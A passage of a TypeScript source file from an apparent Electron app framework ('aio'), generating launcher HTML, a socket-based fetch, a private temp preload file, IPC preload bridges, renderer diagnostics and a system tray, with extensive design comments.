      padding: 0.6rem 0.8rem; background: #16213e; border: 1px solid #26304d;
      border-radius: 8px; margin-bottom: 0.4rem; cursor: pointer;
    }
    .app:hover { border-color: #4a9eff; background: #1b2947; }
    .app .name { font-size: 0.95rem; color: #e0e0e0; }
    .app .meta { font-size: 0.78rem; color: #6b7a99; margin-top: 0.15rem; }
    .app .badge { font-size: 0.7rem; color: #d9a441; }
    .empty { font-size: 0.82rem; color: #55617d; padding: 0.3rem 0; }
    .row { display: flex; align-items: center; gap: 0.4rem; }
    .del { color: #55617d; font-size: 0.8rem; padding: 0 0.3rem; }
    .del:hover { color: #f44; }
    .pairform { flex: 1; display: flex; gap: 0.4rem; }
    .pairform input { padding: 0.5rem 0.7rem; letter-spacing: 0.25em; text-align: center; }
  </style>
</head>
<body>
  <div class="card">
    <h1>aio</h1>
    <form id="f">
      <input id="addr" type="text" placeholder="192.168.88.180:8000" autofocus spellcheck="false" />
      <button type="submit">Connect</button>
    </form>
    <div id="err"></div>

    <div class="section" id="discovered-section" style="display:none">
      <h2><span class="dot scanning" id="scan-dot"></span> Apps on your network</h2>
      <div id="discovered"></div>
    </div>

    <div class="section" id="recents-section" style="display:none">
      <h2>Recent</h2>
      <div id="recents"></div>
    </div>
  </div>
  <script>
    function go(url) {
      if (!url) return;
      if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'http://' + url;
      try { new URL(url); } catch { document.getElementById('err').textContent = 'Invalid URL'; return; }
      document.getElementById('err').textContent = '';
      location.href = url;
    }
    document.getElementById('f').onsubmit = (e) => {
      e.preventDefault();
      go(document.getElementById('addr').value.trim());
    };
    function esc(s) { const d = document.createElement('div'); d.textContent = s == null ? '': String(s); return d.innerHTML.replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }

    // Filled by the Electron main process (see electron-client-script). In a
    // plain browser these stay empty and only the manual field shows.
    function appRow(a, extra) {
      const badge = a.needsAuth ? '<span class="badge">\\u26bf auth</span>': '';
      const sub = esc(a.url || a.host + ':' + a.port);
      const data = 'data-url="' + esc(a.url) + '" data-host="' + esc(a.host || '') +
        '" data-port="' + esc(a.port) + '" data-tls="' + (a.tls ? '1': '') +
        '" data-auth="' + (a.needsAuth ? '1': '') + '"';
      return '<div class="row"><div class="app" ' + data + ' style="flex:1">' +
        '<div><div class="name">' + esc(a.title || a.name) + '</div><div class="meta">' + sub + '</div></div>' +
        badge + '</div>' + (extra || '') + '</div>';
    }
    // Auth apps with no token yet → pair by PIN. Everything else connects directly.
    function onAppClick(el) {
      const url = el.getAttribute('data-url') || '';
      if (el.getAttribute('data-auth') === '1' && !/[?&]token=/.test(url)) promptPair(el);
      else go(url);
    }
    function promptPair(el) {
      const host = el.getAttribute('data-host');
      const port = Number(el.getAttribute('data-port'));
      const tls = el.getAttribute('data-tls') === '1';
      const row = el.closest('.row');
      row.innerHTML = '<form class="pairform">' +
        '<input class="pin" inputmode="numeric" maxlength="6" placeholder="pair code" spellcheck="false" />' +
        '<button type="submit">Pair</button></form>';
      const form = row.querySelector('.pairform');
      form.onsubmit = (e) => {
        e.preventDefault();
        const pin = row.querySelector('.pin').value.trim();
        if (!/^[0-9]{6}$/.test(pin)) { document.getElementById('err').textContent = 'Enter the 6-digit code shown by the app'; return; }
        document.getElementById('err').textContent = 'Pairing\\u2026';
        location.href = 'aio-pair:' + encodeURIComponent(JSON.stringify({ host, port, tls, pin }));
      };
      row.querySelector('.pin').focus();
    }
    window.__aioSetDiscovered = function(apps) {
      const sec = document.getElementById('discovered-section');
      const box = document.getElementById('discovered');
      sec.style.display = 'block';
      if (!apps || !apps.length) { box.innerHTML = '<div class="empty">searching\\u2026</div>'; return; }
      box.innerHTML = apps.map((a) => appRow(a)).join('');
      box.querySelectorAll('.app').forEach((el) => el.onclick = () => onAppClick(el));
    };
    window.__aioScanDone = function() { const d = document.getElementById('scan-dot'); if (d) d.classList.remove('scanning'); };
    window.__aioSetRecents = function(items) {
      const sec = document.getElementById('recents-section');
      const box = document.getElementById('recents');
      if (!items || !items.length) { sec.style.display = 'none'; return; }
      sec.style.display = 'block';
      box.innerHTML = items.map((a) => appRow(a, '<span class="del" data-del="' + esc(a.url) + '">\\u2715</span>')).join('');
      box.querySelectorAll('.app').forEach((el) => el.onclick = () => onAppClick(el));
      box.querySelectorAll('.del').forEach((el) => el.onclick = (e) => {
        e.stopPropagation();
        location.href = 'aio-forget:' + encodeURIComponent(el.getAttribute('data-del'));
      });
    };
  </script>
</body>
</html>`;

// ── UDS-mode template helpers ──

/** The Electron main process's ONE door to the app: a request to the app's
 *  HTTP handler over its local socket — a Unix socket, or a named pipe
 *  (`\\.\pipe\…`) on Windows. Node's `http.request` speaks both natively (the
 *  `socketPath` option, libuv underneath), so the page, its modules and every
 *  asset arrive through the SAME handler an `http://` fetch would have
 *  reached — headers, status and bytes intact, nothing re-encoded.
 *
 *  Emitted as source rather than written inline in the generated main so a
 *  test can run it against a real server on a real socket; the two shapes
 *  below are behaviour, not text, and were found by a frozen app.
 *
 *  ① BOUNDED CONNECTIONS. It used to use Node's global agent —
 *  `maxSockets: Infinity`, keep-alive — so a page with N `<img src>` opened N
 *  connections at once, each holding a pending read on the server. Chromium
 *  itself caps a host at 6; this does the same, for the same reason.
 *
 *  ② A BODY NOBODY READS IS READ HERE. `<img>` fires `error` at a 404's
 *  headers and never reads the rest, so the response stream was never
 *  cancelled, Node kept the socket open and unread, and the server sat in its
 *  drain until the app froze (field report §13: 58 unread 404 bodies). A body
 *  that is declared small, or that belongs to an error status, is therefore
 *  consumed here before the Response resolves — the connection is done with
 *  whatever the renderer does next. Everything else still STREAMS (a 100 MB
 *  route response is never buffered in this process), and dropping that
 *  stream destroys the response instead of leaking it. */
export function tmplSocketFetch(): string {
  return `
// Chromium's own per-host cap, applied to the app's socket: a page with 60
// <img> tags must not open 60 connections to it.
const AIO_MAX_SOCKETS = 6;
// The body sizes worth taking in one piece here rather than streaming.
const AIO_SMALL_BODY = 64 * 1024;
// How long a request may go without the app answering AT ALL. The agent caps
// this app at AIO_MAX_SOCKETS, so that cap is also a queue: six requests with
// no bound hold six sockets forever and every later request in the window
// waits behind them, permanently. Bounded to the FIRST byte of the response
// only — a long-lived stream (SSE, a large download) is never touched once
// its headers are here.
const AIO_REQ_TIMEOUT_MS = (() => {
  const raw = typeof process !== 'undefined' && process.env
    ? Number(process.env.AIO_SOCKET_TIMEOUT_MS)
    : NaN;
  return Number.isFinite(raw) && raw > 0 ? raw : 30000;
})();
const __aioAgents = new Map();
function __aioAgent(mod, key) {
  let a = __aioAgents.get(key);
  if (!a) { a = new mod.Agent({ keepAlive: true, maxSockets: AIO_MAX_SOCKETS }); __aioAgents.set(key, a); }
  return a;
}
function socketFetch(reqPath, method, headers, body) {
  return new Promise((resolveRaw) => {
    const { Readable } = require('stream');
    // ONE settle for every exit — the response, the error, the timeout — so
    // the deadline below is always disarmed and no path can resolve twice.
    let __aioSettled = false;
    let __aioDeadline;
    const resolve = (r) => {
      if (__aioSettled) return;
      __aioSettled = true;
      clearTimeout(__aioDeadline);
      resolveRaw(r);
    };
    // The socket when this app has one; otherwise the HTTP server (forced
    // aio:// in dev). A self-signed --expose cert is this app's own — the
    // http:// branch trusts it the way certificate-error does below.
    let target, http, key;
    if (HTTP_SOCK) { http = require('http'); key = 'sock'; target = { socketPath: HTTP_SOCK }; }
    else {
      const u = new URL(HTTP_URL);
      key = u.protocol === 'https:' ? 'https' : 'http';
      http = require(key);
      target = { host: u.hostname, port: u.port, rejectUnauthorized: false };
    }
    const r = http.request(
      { ...target, agent: __aioAgent(http, key), path: reqPath, method: method || 'GET', headers: headers || {} },
      (res) => {
        const h = {};
        for (const [k, v] of Object.entries(res.headers)) {
          if (typeof v === 'string') h[k] = v;
          else if (Array.isArray(v)) h[k] = v.join(', ');
        }
        const status = res.statusCode || 200;
        // A body-less status must not carry a stream — Response() throws.
        const noBody = status === 204 || status === 304 || (method || 'GET') === 'HEAD';
        if (noBody) { res.resume(); resolve(new Response(null, { status, headers: h })); return; }
        // Small-and-declared, or an error: read it out now. Nobody reads a
        // 404's body, and an unread body is a connection the server cannot
        // finish with.
        const len = Number(res.headers['content-length']);
        if ((Number.isFinite(len) && len <= AIO_SMALL_BODY) || status >= 400) {
          const chunks = [];
          let got = 0;
          let capped = false;
          res.on('data', (c) => {
            got += c.length;
            chunks.push(c);
            // An error body with no content-length is unbounded: take the
            // first page of it and drop the rest rather than buffer a stream
            // that was never meant for a human.
            if (got > AIO_SMALL_BODY) { capped = true; res.destroy(); }
          });
          // A DECLARED length that did not all arrive is a truncated
          // resource, and the streaming branch below fails loudly on exactly
          // that (the reader's \`for await\` throws \`aborted\`). Buffering must
          // not turn it into a 200 with a short body and the original
          // content-length: a module or stylesheet cut in half would reach
          // the page as a syntax error with nothing naming the cause. The
          // app's own socket CAN cut one short — win-pipe's drain closes a
          // connection whose peer stopped reading (PIPE_DRAIN_TIMEOUT_MS).
          const done = () => {
            if (!capped && Number.isFinite(len) && got < len) {
              resolve(new Response(
                'aio: the app closed the connection after ' + got + ' of ' + len +
                  ' bytes of ' + reqPath + ' — the response is truncated',
                { status: 502, headers: { 'Content-Type': 'text/plain' } },
              ));
              return;
            }
            resolve(new Response(Buffer.concat(chunks), { status, headers: h }));
          };
          res.on('end', done);
          res.on('close', done);
          res.on('error', done);
          return;
        }
        // Everything else streams. cancel() DESTROYS the response: a renderer
        // that drops the stream must cost this process a closed socket, not a
        // connection the app is still writing into.
        resolve(new Response(new ReadableStream({
          start(c) {
            res.on('data', (chunk) => {
              try { c.enqueue(new Uint8Array(chunk)); } catch { res.destroy(); return; }
              if (c.desiredSize !== null && c.desiredSize <= 0) res.pause();
            });
            res.on('end', () => { try { c.close(); } catch {} });
            res.on('error', (e) => { try { c.error(e); } catch {} });
          },
          pull() { res.resume(); },
          cancel() { res.destroy(); },
        }), { status, headers: h }));
      },
    );
    const __aioWhere = HTTP_SOCK ? 'socket (' + HTTP_SOCK + ')' : 'HTTP server (' + HTTP_URL + ')';
    // A dead socket must not hang the window forever on a blank page. Say what
    // failed, in the window, where the developer is already looking.
    r.on('error', (e) => resolve(new Response(
      'aio: cannot reach the app over its ' + __aioWhere + ': ' + e.message,
      { status: 502, headers: { 'Content-Type': 'text/plain' } },
    )));
    // A peer that ACCEPTS and never answers is not an error — nothing fails,
    // nothing closes, and without this the promise never settles and the
    // socket is never given back. Six of those and the window is finished.
    // Loud on both sides: a 504 the developer sees in the window, and a line
    // in the main process's log, which is where an agent or an operator
    // looks. Destroying the request is what frees the socket for the queue.
    __aioDeadline = setTimeout(() => {
      const msg = 'aio: no answer from the app for ' + (method || 'GET') + ' ' +
        reqPath + ' after ' + AIO_REQ_TIMEOUT_MS + ' ms over its ' + __aioWhere +
        '. The request was dropped so the window keeps working; if this route is ' +
        'legitimately that slow to its FIRST byte, raise AIO_SOCKET_TIMEOUT_MS.';
      // aio-ok: the 504 below is the real answer; a main process whose
      // console is gone must not turn a timeout into an unhandled throw.
      try { console.error(msg); } catch {}
      resolve(new Response(msg, { status: 504, headers: { 'Content-Type': 'text/plain' } }));
      // After the resolve: destroy() fires 'error', which the handler above
      // now finds already settled.
      // aio-ok: the caller already has its 504. destroy() is housekeeping
      // to give the socket back, and a socket already gone needs none.
      try { r.destroy(new Error('aio: request timed out after ' + AIO_REQ_TIMEOUT_MS + ' ms')); } catch {}
    }, AIO_REQ_TIMEOUT_MS);
    if (body && typeof body.getReader === 'function') Readable.fromWeb(body).pipe(r);
    else { if (body) r.write(body); r.end(); }
  });
}`;
}

/** Where a generated shell WRITES its preload — the one file in a launch that
 *  is code the renderer will run.
 *
 *  Both shells wrote `<temp>/__aio_preload_<pid>.cjs` with no mode: a name
 *  anyone on the box can work out in advance, at the process umask (0644 on a
 *  default install), in a directory every user shares. The main script beside
 *  it has always been `Deno.makeTempFile()` — random name, 0600 — so this was
 *  the odd one out rather than a policy (an audit, §8).
 *
 *  A private directory, not just a mode: `mode:` is the mode a file is CREATED
 *  with and is ignored for one that already exists, which is exactly the case a
 *  predictable name invites. `mkdtempSync` makes the directory 0700 with a name
 *  nobody could have waited for, and the file inside it is 0600.
 *
 *  The markers are load-bearing: `tests/electron-preload-file.test.ts` cuts
 *  this block out of the generated script and RUNS it against real `node:fs`,
 *  so the mode is asserted on a file rather than on the text that was meant to
 *  produce one. Emits `preloadDir` and `preloadFile`; expects `fs`, `path` and
 *  `app` in scope, and `code` is the expression holding the preload source.
 *  Sweep it with {@linkcode tmplPreloadCleanup}. */
export function tmplPreloadWrite(code: string): string {
  return `// …swept on the way out, whichever way out this is. \`window-all-closed\` is
// one of them and not the common one: aio's own shutdown kills this process
// (shutdown.ts, phase "electron" — \`ep.kill()\`, i.e. SIGTERM), so every
// Ctrl-C'd \`deno task dev\`, every dev restart and every test that stops an
// app used to leave one private directory per launch behind in <temp>.
// The signal handlers RE-RAISE after sweeping, so the exit status this
// process reports is the one it would have had (electronClosedPlan reads it).
//
// ARMED BEFORE THE DIRECTORY EXISTS, which is the whole reason this sits
// above the block instead of below it. Creating first and arming second
// leaves a window — short, and wide open on a loaded machine — in which a
// SIGTERM takes the default action and the directory it names outlives the
// process. That is not a theory: it is how the suite caught this, under load,
// after the sweep itself had already shipped. \`preloadDir\` is referenced
// before its declaration on purpose: a sweep that runs in that window throws
// on the temporal dead zone and the catch turns it into the no-op it is —
// there is nothing on disk to remove yet.
const __aioSweepPreload = () => { try { fs.rmSync(preloadDir, { recursive: true, force: true }); } catch {} };
process.on('exit', __aioSweepPreload);
for (const __aioSig of ['SIGTERM', 'SIGINT', 'SIGHUP']) {
  try {
    process.on(__aioSig, () => {
      __aioSweepPreload();
      process.removeAllListeners(__aioSig);
      try { process.kill(process.pid, __aioSig); } catch { process.exit(0); }
    });
  } catch {}
}
// ── aio preload file — a private 0700 dir, the file 0600 ──
const preloadDir = fs.mkdtempSync(path.join(app.getPath('temp'), 'aio-preload-'));
const preloadFile = path.join(preloadDir, 'preload.cjs');
fs.writeFileSync(preloadFile, ${code}, { mode: 0o600 });
// ── end aio preload file ──`;
}

/** Removes the preload directory {@linkcode tmplPreloadWrite} made. The file
 *  alone would leave an empty directory per launch behind in `<temp>`. */
export function tmplPreloadCleanup(): string {
  return `__aioSweepPreload();`;
}

/** Generates preload script CJS code (contextBridge IPC + AIO-54 navigate relay) */
export function udsPreloadScript(): string {
  return `
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('__aioIPC', {
  send:      (json) => ipcRenderer.send('__aio:send', json),
  ready:     ()     => ipcRenderer.send('__aio:ready'),
  onMessage: (fn)   => ipcRenderer.on('__aio:msg',   (_e, line) => fn(line)),
  onOpen:    (fn)   => ipcRenderer.on('__aio:open',  () => fn()),
  onClose:   (fn)   => ipcRenderer.on('__aio:close', () => fn()),
  // Renderer window.print() is a silent no-op on Electron 41 Linux — route through main
  print:     ()     => ipcRenderer.send('__aio:print'),
  // open an http/https link in the system browser. The main process
  // enforces the allowlist — a renderer can't reach arbitrary shell targets.
  openExternal: (url) => ipcRenderer.send('__aio:openExternal', url),
  // Child window: open an http/https page in a CHILD BrowserWindow whose
  // preload (a file the app ships inside its own directory) can inject a
  // provider — e.g. a wallet provider speaking to the app's local bridge.
  // Gated by aio.run({ childWindows: true }); the main process validates the
  // URL and the preload path. opts: { preload, sandbox } — sandbox stays ON
  // unless the app EXPLICITLY passes sandbox: false (logged).
  //
  // invoke, NOT send: this one ANSWERS. The main process writes an excellent
  // refusal — it even names the config key to add — and send is one-way, so
  // the renderer that asked got undefined back, and every refusal was audible
  // only to whoever was reading the main-process console. A field report
  // measured the cost: their caller was openWindow(...).catch(fallBack), and
  // undefined has no .catch, so the TypeError took the fallback path and the
  // page opened in the user's system browser instead — forever, silently, for
  // a rule nobody was told about. Additive: undefined becomes a Promise, so a
  // fire-and-forget caller is unchanged and an awaiting one now REJECTS with
  // the reason. The main process keeps an ipcMain.on + event.reply leg for
  // any preload still speaking the old way.
  //
  // No backticks in this comment ON PURPOSE — it lives inside a template
  // literal, and one would close the string. See the will-attach-webview note
  // above: a syntax error here is a window that never opens.
  openWindow: (url, opts) => ipcRenderer.invoke('__aio:openWindow', { url, ...(opts || {}) }),
});
${shellBridgePreload()}
// Window controls for ui.chrome "themed"/"none": a frameless window loses
// minimise, maximise and close along with its frame, and a page cannot get
// them back on its own. Exposed ALWAYS (not only when themed) so an app using
// chrome:"none" can build its own bar out of the same three verbs — the bridge
// is the capability; the title bar is just one consumer of it.
contextBridge.exposeInMainWorld('__aioWindow', {
  minimize: () => ipcRenderer.send('__aio:win', 'minimize'),
  maximize: () => ipcRenderer.send('__aio:win', 'maximize'),
  close:    () => ipcRenderer.send('__aio:win', 'close'),
});
// AIO-54: Relay intercepted <a> navigations back to renderer as CustomEvent
ipcRenderer.on('__aio:navigate', (_e, url) => {
  window.dispatchEvent(new CustomEvent('aio:navigate', { detail: { url } }));
});
${udsPreloadDiagnostics()}
`;
}

/** The renderer's side of "did the page paint, and what did it throw" — CJS
 *  for the preload (isolated world, shares the page's DOM).
 *
 *  Mount: a MutationObserver on the document reports the moment `#root` has a
 *  child — `ui mounted N element(s)` — once per document. The count is the
 *  proof the artifact e2e and the onboarding lab assert on; before it existed,
 *  "the window is mapped" was the strongest claim a test could make about a
 *  packaged app, and a mapped window with a dead renderer passed it.
 *
 *  Errors are NOT collected here, on purpose: the preload's isolated world
 *  does not receive the page world's `error`/`unhandledrejection` events
 *  (measured — listeners here stayed silent while the page threw). Chromium
 *  writes every uncaught throw and rejection to the console with its source
 *  and line, and the main process reads that stream (`console-message` in
 *  `tmplRendererDiagnostics`) — one channel, the one that actually fires. */
export function udsPreloadDiagnostics(): string {
  return `
(function () {
  let mounted = false;
  const report = () => {
    if (mounted) return true;
    const r = document.getElementById('root');
    if (!r || r.childElementCount === 0) return false;
    mounted = true;
    ipcRenderer.send('__aio:mounted', r.querySelectorAll('*').length);
    return true;
  };
  const start = () => {
    if (report()) return;
    const mo = new MutationObserver(() => { if (report()) mo.disconnect(); });
    mo.observe(document, { childList: true, subtree: true });
  };
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', start);
  else start();
})();
`;
}

/** The main-process side: every way a renderer can fail, and its one success
 *  signal, written to THIS process's stderr as `${RENDERER_TAG}<level>] …` —
 *  the Deno parent reads that stream and routes each line to the framework
 *  logger at that level (electron-spawn.ts, `classifyElectronLine`), so a
 *  throw in the page lands in the app log, in `am logs`, and on the console
 *  at ERROR, with the file:line Chromium gave it.
 *
 *  Why here and not `console.error` in the shell: the child's stdout is the
 *  app's own inherited stream and never reaches the app LOG; stderr is the
 *  stream the parent already reads (to drop GPU-probe noise). One tagged
 *  stream, one classifier.
 *
 *  `hasMountSignal`: the UDS shell's preload reports `__aio:mounted`; the
 *  WebSocket shell has no preload, so its watchdog would fire on every healthy
 *  page — it gets the error hooks and no mount deadline.
 *
 *  Expects `win` and `ipcMain` in scope. */
export function tmplRendererDiagnostics(hasMountSignal: boolean): string {
  // The encoder half of `classifyElectronLine` — same tag, same fold.
  return `
  const _aioUpstreamNoise = ${upstreamNoiseMatcherSource()};
  const _rlog = (level, msg) => {
    try { process.stderr.write(${JSON.stringify(RENDERER_TAG)} + level + '] ' +
      String(msg).replace(/\\r?\\n/g, ' \u23ce ') + '\\n'); } catch {}
  };
  // console-message: Electron ≥ 30 passes one details object ({level:
  // 'info'|'warning'|'error'|'debug', message, lineNumber, sourceId}); older
  // runtimes pass positionals (event, level 0-3, message, line, sourceId).
  // Both are read, so the app's Electron pin cannot silence this.
  // Rest args on purpose: Electron reads the listener's arity and nags
  // "'console-message' arguments are deprecated" for any named positional.
  win.webContents.on('console-message', (e, ...a) => {
    let lv, msg, ln, src;
    if (e && typeof e.level === 'string') { lv = e.level; msg = e.message; ln = e.lineNumber; src = e.sourceId; }
    else { lv = ['debug', 'info', 'warning', 'error'][a[0]] || 'info'; msg = a[1]; ln = a[2]; src = a[3]; }
    if (lv !== 'error' && lv !== 'warning') return;
    // An error the RUNTIME threw, not the app: named, annotated, and logged
    // at info so it never reaches errors=N or a red overlay badge. It is
    // not dropped — a permanently lit error indicator and a swallowed line
    // are the same failure from opposite sides. The matcher is generated from
    // ONE list (diagnostics/upstream-noise.ts) rather than copied here.
    const _known = _aioUpstreamNoise(msg, src);
    if (_known) { _rlog('info', _known + (src ? ' (' + src + ':' + ln + ')' : '')); return; }
    _rlog(lv === 'error' ? 'error' : 'warn', String(msg) + (src ? ' (' + src + ':' + ln + ')' : ''));
  });
  win.webContents.on('render-process-gone', (_e, d) => {
    _rlog('error', 'renderer process gone: ' + (d && d.reason) + ' (exit code ' + (d && d.exitCode) + ')');
  });
  win.webContents.on('preload-error', (_e, p, err) => {
    _rlog('error', 'preload failed: ' + ((err && err.message) || err) + ' (' + p + ')');
  });
  win.webContents.on('unresponsive', () => _rlog('error', 'renderer unresponsive'));
  win.webContents.on('responsive', () => _rlog('info', 'renderer responsive again'));
  win.webContents.on('did-fail-load', (_e, code, desc, failedUrl, isMainFrame) => {
    if (isMainFrame === false || code === -3) return; // -3: ERR_ABORTED (superseded)
    _rlog('error', 'page failed to load: ' + failedUrl + ' (' + code + ' ' + desc + ')');
  });
  let _mounted = false;
  ipcMain.on('__aio:mounted', (_e, n) => {
    _mounted = true;
    _rlog('info', ${JSON.stringify(MOUNT_LINE[0])} + n + ${
    JSON.stringify(MOUNT_LINE[1])
  });
  });
  // did-navigate fires for MAIN-FRAME navigations only (a <webview> guest or
  // an in-page hash change never resets the verdict).
  win.webContents.on('did-navigate', () => { _mounted = false; });
${
    hasMountSignal
      ? `  // A loaded page whose #root stays empty is the blank window the field
  // report described — say so, at error, with where to look.
  // One verdict per LOAD: a reload arms a new timer and retires the old one,
  // or every load in a dev reload burst would report on the newest page.
  let _loadGen = 0;
  win.webContents.on('did-finish-load', () => {
    const gen = ++_loadGen;
    setTimeout(() => {
      if (gen !== _loadGen || _mounted || win.isDestroyed()) return;
      _rlog('error', 'ui did not mount within ${MOUNT_DEADLINE_MS}ms of the page loading — #root is empty. ' +
        'The renderer errors above say why (a throw at module scope in the bundle is the usual cause).');
    }, ${MOUNT_DEADLINE_MS});
  });`
      : ""
  }
`;
}

// `mountLine` is the wire spelling the shell writes above; re-exported here so
// the shell generators and the tests read one name.
export { mountLine };

/** Generates prod-mode index.html for the aio:// protocol.
 *
 *  This DELEGATES to the one prod shell (`generateHTML(prod: true)`) rather
 *  than hand-rolling a second one. It used to be its own copy, and the copy
 *  silently dropped every `<head>` input — `ui.head`, `ui.viewport`,
 *  `ui.showStatus`, the `aio:width/height` metas. The result was a packaged
 *  Electron app that did not look like the same app in dev: a `ui.head` reset
 *  (body margin, `color-scheme`) applied under `deno task dev` and vanished in
 *  the AppImage. Divergence between the shells IS the bug class, so there is
 *  now only one shell.
 *
 *  `renderBudget`/`syncCells`/`callTimeouts` stay unset here on purpose — a
 *  build-time-templated shell cannot know them, which is exactly why the
 *  server sends the "cfg" frame (see `_applyServerConfig`). Shell-injected
 *  keys win; these gaps are filled at connect. Only head content, which no
 *  frame can retrofit, has to be threaded through. */
export function udsProdHTML(
  title: string,
  hasCSS: boolean,
  shell?: ShellConfig,
): string {
  // renderBudget / uiEntry / syncCells / callTimeouts are deliberately absent —
  // see the note above: the cfg frame fills them at connect.
  return generateHTML({
    title,
    prod: true,
    hasCSS,
    importMap: "", // prod bundles its own imports
    showStatus: shell?.showStatus,
    width: shell?.width,
    height: shell?.height,
    viewport: shell?.viewport,
    headExtra: shell?.head,
    chrome: shell?.chrome,
    theme: shell?.theme,
    themeName: shell?.themeName,
    lang: shell?.lang,
    layout: shell?.layout,
    dir: shell?.dir,
    csp: shell?.csp,
    nonce: shell?.nonce,
  });
}

/** The SHELL bridge — what a page can ask the Electron window itself for,
 *  whatever transport it speaks: focus, and the tray's clicks. Separate from
 *  `__aioIPC` on purpose — that bridge's PRESENCE is what selects the IPC
 *  transport, so the WebSocket window must expose this one and not that.
 *  `standalone` prepends the require for a preload that has nothing else. */
export function shellBridgePreload(
  opts: { standalone?: boolean } = {},
): string {
  return `${
    opts.standalone
      ? "const { contextBridge, ipcRenderer } = require('electron');\n"
      : ""
  }contextBridge.exposeInMainWorld('__aioShell', {
  focus:  ()   => ipcRenderer.send('__aio:focus'),
  onTray: (fn) => ipcRenderer.on('__aio:tray', (_e, item) => fn(item)),
});`;
}

/** `ui.tray` — the system tray icon, its menu, and close-to-tray. ONE
 *  template for both shells (the zero-port UDS one and the WebSocket one): a
 *  tray that existed in one and not the other is the shell divergence this
 *  file exists to prevent. `iconExpr` is a JS expression the shell supplies
 *  for a nativeImage (or null, or a promise of either); `title` the tooltip
 *  fallback. Expects `win`, `app`, `ipcMain` and `__aioQuitting` in scope.
 *  Always emits `__aioHiding` — the UDS shell's close handler reads it. */
export function tmplTray(
  meta: AioMeta | undefined,
  iconExpr: string,
  title: string | undefined,
): string {
  const t = meta?.tray;
  const cfg: TrayConfig | null = t === true
    ? {}
    : (t && typeof t === "object")
    ? t
    : null;
  return `
  // ── System tray (ui.tray) ──
  const TRAY = ${JSON.stringify(cfg)};
  let __aioHiding = false;
  ipcMain.on('__aio:focus', () => { if (!win.isDestroyed()) { win.show(); win.focus(); } });
  if (TRAY) {
    if (TRAY.closeToTray) {
      // Close = hide. A real quit — the tray's Quit, Cmd+Q, app.quit() — sets
      // __aioQuitting (before-quit) before 'close' fires, so it passes.
      win.on('close', (e) => { if (!__aioQuitting) { __aioHiding = true; e.preventDefault(); win.hide(); } });
    }
    (async () => {
      const { Tray, Menu, nativeImage } = require('electron');
      let icon = null;
      try { icon = await (${iconExpr}); } catch (e) { console.error('[aio] tray icon: ' + (e && e.message || e)); }
      // A desktop with no status-notifier host (a bare X session, GNOME
      // without the AppIndicator extension) throws HERE. That is not the
      // app failing; it is a tray that cannot exist on this desktop, so it
      // is named once and the app runs on without it.
      let tray;
      try { tray = new Tray(icon || nativeImage.createEmpty()); }
      catch (e) { console.error("[aio] ui.tray: no system tray on this desktop — " + (e && e.message || e)); return; }
      tray.setToolTip(TRAY.tooltip || ${JSON.stringify(title ?? "aio app")});
      const show = () => { if (win.isDestroyed()) return; win.show(); win.focus(); };
      const items = [];
      for (const it of TRAY.menu || []) {
        if (it === '-') { items.push({ type: 'separator' }); continue; }
        if (!it || typeof it.label !== 'string') continue;
        items.push({ label: it.label, click: () => {
          if (it.route) show();
          // The click is DISPATCHED by the page, through the same door every
          // button uses — acks, validation, the offline queue.
          if (!win.isDestroyed()) win.webContents.send('__aio:tray', { method: it.method, args: it.args, route: it.route });
        } });
      }
      if (items.length) items.push({ type: 'separator' });
      items.push({ label: 'Show', click: show });
      items.push({ label: 'Hide', click: () => { if (!win.isDestroyed()) win.hide(); } });
      items.push({ label: 'Quit', click: () => { __aioQuitting = true; app.quit(); } });
      tray.setContextMenu(Menu.buildFromTemplate(items));
      tray.on('click', () => { if (win.isDestroyed()) return; if (win.isVisible()) win.hide(); else show(); });
      // Keep a reference: a Tray nothing holds is garbage-collected and vanishes.
      globalThis.__aioTray = tray;
    })();
  }`;
}
